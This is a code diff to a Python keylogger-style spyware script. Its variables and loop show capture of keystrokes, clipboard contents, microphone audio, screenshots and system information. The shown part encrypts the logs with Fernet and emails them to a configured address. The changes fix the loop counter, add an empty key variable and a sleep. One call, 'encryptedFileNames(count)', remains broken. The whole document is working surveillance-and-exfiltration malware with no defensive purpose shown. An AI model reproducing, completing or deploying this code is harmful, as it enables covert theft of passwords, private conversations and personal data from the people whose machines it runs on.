@@ -33,7 +33,7 @@ clipboardInfoFile = "clipboardInfo.log" #clipboard Info File
 micDataFile = "micData.wav" #Audio Recording File
 screenshotDataFile = "screenshot.png" #Screenshot File
 
-filePath = "filename"
+filePath = ""
 extend = "\\"
 fileMerge = filePath + extend
 
@@ -48,6 +48,7 @@ timeIteration = 10
 emailID = ""
 emailPassword = ""
 toAddr = ""
+key = ""
 
 #Features Function
 def sendEmail(filename, attachment, toAddr):
@@ -192,10 +193,10 @@ while numOfIterations < numOfIterationsEnd:
 filesToEncrypt = [fileMerge + systemInfoFile, fileMerge + clipboardInfoFile, fileMerge + keyInfoFile]
 encryptedFileNames = [fileMerge + systemInfoFile_e, fileMerge + clipboardInfoFile_e, fileMerge + keyInfoFile_e]
 
-count2 = 0
+count = 0
 
 for encryptingFile in filesToEncrypt:
-    with open(filesToEncrypt[count2], 'rb') as f:
+    with open(filesToEncrypt[count], 'rb') as f:
         data = f.read()
 
     fernet = Fernet(key)
@@ -205,3 +206,6 @@ for encryptingFile in filesToEncrypt:
         f.write(encrypted)
     
     sendEmail(encryptedFileNames(count), encryptedFileNames[count], toAddr)
+    count += 1
+
+time.sleep(120)
